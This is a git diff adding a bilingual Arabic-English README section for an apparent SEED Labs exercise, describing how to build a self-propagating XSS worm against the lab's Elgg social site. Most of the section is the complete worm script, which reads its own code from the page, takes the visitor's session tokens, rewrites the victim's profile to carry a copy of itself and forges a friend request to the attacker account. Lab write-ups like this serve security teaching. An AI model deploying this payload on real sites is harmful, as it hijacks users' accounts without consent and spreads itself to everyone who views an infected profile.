@@ -280,3 +280,67 @@ http://www.seed-server.com
    
 
 
+# README - Task 6: Writing a Self-Propagating XSS Worm
+
+## 📌 1. فكرة التاسك والأهداف (Task Concept & Objectives)
+* **الفكرة العامة:** تحويل السكريبت إلى **دودة سيبرانية حقيقية متكاثرة ذاتياً (`Self-Propagating Worm`)**، بحيث لا تكتفي بتعديل بروفايل الضحية وإضافة الصديق فحسب، بل تنسخ نفسها داخل ملف الضحية الجديد ليتحول هو الآخر إلى ناشر للعدوى لأي شخص يزوره.
+* **الأسلوب المستخدم:** `DOM Approach`، حيث يقوم الكود بقراءة نفسه من الصفحة الحالية عبر الـ `DOM` وتشفيرها وإرفاقها مع طلب الـ `POST` الخاص بتعديل البروفايل.
+* **الأهداف:**
+  1. فهم آلية انتشار البرمجيات الخبيثة والدودية (Worms propagation mechanics).
+  2. استخراج كود الـ JavaScript برمجيياً باستخدام معرفات الـ DOM (`getElementById` و `innerHTML`).
+
+---
+
+## 📌 1. Task Concept & Objectives (English)
+* **General Idea:** Upgrading the script into a true **Self-Propagating XSS Worm**, which not only modifies the victim's profile and adds a friend but also embeds a copy of itself into the victim's profile, turning them into a carrier of the worm.
+* **Approach Used:** `DOM Approach`, where the worm extracts its own code via the DOM, encodes it, and appends it to the profile-update POST request.
+* **Objectives:**
+  1. Understand worm propagation mechanics.
+  2. Programmatically extract JavaScript source code using DOM APIs (`getElementById` and `innerHTML`).
+
+---
+
+## 🛠️ 2. خطوات التنفيذ العملية (Step-by-Step Implementation)
+1. تسجيل الدخول بحساب **Samy** والانتقال لصفحة تعديل الملف الشخصي وتفعيل وضع **Edit HTML**.
+2. لصق كود الدودة المكتمل (مع مراعاة مطابقة رقم الـ `samyGuid` الصحيح):
+
+```bash
+   <script id="worm" type="text/javascript">
+window.onload = function () {
+    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+    var jsCode = document.getElementById("worm").innerHTML;
+    var tailTag = "</" + "script>";
+    
+    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+    
+    var userName = "&name=" + elgg.session.user.name;
+    var guid = "&guid=" + elgg.session.user.guid;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+    
+    var content = token + ts + userName + '&description=Samy is my hero ' + wormCode;
+    
+    var samyGuid = 59; // تأكدي أنه رقم سامي الحقيقي لديك
+    var sendurl = "http://www.seed-server.com/action/profile/edit";
+    var friendurl = "http://www.seed-server.com/action/friends/add?friend=" + samyGuid + ts + token;
+
+    if (elgg.session.user.guid != samyGuid) {
+        var Ajax = new XMLHttpRequest();
+        Ajax.open("POST", sendurl, true);
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
+
+        var AjaxFriend = new XMLHttpRequest();
+        AjaxFriend.open("GET", friendurl, true);
+        AjaxFriend.send();
+    }
+}
+</script>
+
+```
+   * اختبار الانتشار عبر زيارة الضحية الأول لصفحة سامي، ثم زيارة مستخدم ثالث لصفحة الضحية الأول للتأكد من انتقال العدوى وتكاثر الدودة.
+   
+
+   ![login-2](test-11.png)
+   ![login-2](test-12.png)
+   ![login-2](test-13.png)
